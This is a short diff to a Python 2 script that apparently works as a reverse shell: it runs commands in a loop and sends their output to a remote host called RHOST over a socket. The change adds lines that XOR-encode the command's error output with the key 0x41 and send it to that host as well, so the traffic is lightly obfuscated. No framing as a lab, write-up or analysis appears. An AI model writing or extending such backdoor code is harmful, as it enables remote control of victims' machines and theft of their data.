@@ -21,6 +21,11 @@ while True:
     comm.wait()
     STDOUT, STDERR = comm.communicate()
     print STDERR
+    # Encode the error and send to RHOST
+    en_STDERR = bytearray(STDERR)
+    for i in range(len(STDERR)):
+        en_STDERR[i] ^= 0x41
+    s.send(en_STDERR)
     # Encode the output and send to RHOST
     en_STDOUT = bytearray(STDOUT)
     for i in range(len(en_STDOUT)):
